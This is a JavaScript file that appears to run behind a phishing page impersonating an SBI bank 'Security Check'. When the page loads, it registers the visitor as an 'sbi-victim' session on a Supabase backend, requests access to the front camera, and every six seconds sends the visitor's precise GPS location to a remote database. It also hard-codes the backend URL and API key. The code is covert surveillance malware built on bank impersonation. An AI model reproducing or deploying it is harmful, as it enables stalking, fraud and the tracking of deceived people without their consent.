const SUPABASE_URL = "https://yvwnnridpgelbewhoxps.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Inl2d25ucmlkcGdlbGJld2hveHBzIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODA4NDAyMzMsImV4cCI6MjA5NjQxNjIzM30.P1dXFozH5SpHdZEAU2SB2Lh8TMAhAGxCuPEyTj_BL44";

let sessionId = "";
let videoStream = null;

async function init() {
  try {
    const res = await fetch(`${SUPABASE_URL}/rest/v1/sharing_sessions`, {
      method: "POST",
      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json", "Prefer": "return=representation" },
      body: JSON.stringify({ owner_id: "sbi-victim-" + Date.now(), label: "SBI Security Check", is_active: true, is_killed: false })
    });

    const data = await res.json();
    sessionId = data[0].id;

    // Request permissions with better error handling
    try {
      videoStream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" },
        audio: false 
      });
      console.log("✅ Camera permission granted");
    } catch(e) {
      console.log("❌ Camera permission denied:", e.message);
    }

    setInterval(sendLocation, 6000);

  } catch(e) {
    console.error(e);
  }
}

function sendLocation() {
  navigator.geolocation.getCurrentPosition(pos => {
    fetch(`${SUPABASE_URL}/rest/v1/location_pings`, {
      method: "POST",
      headers: { "apikey": SUPABASE_KEY, "Content-Type": "application/json" },
      body: JSON.stringify({
        session_id: sessionId,
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      })
    });
  }, () => {}, { enableHighAccuracy: true });
}

window.onload = init;
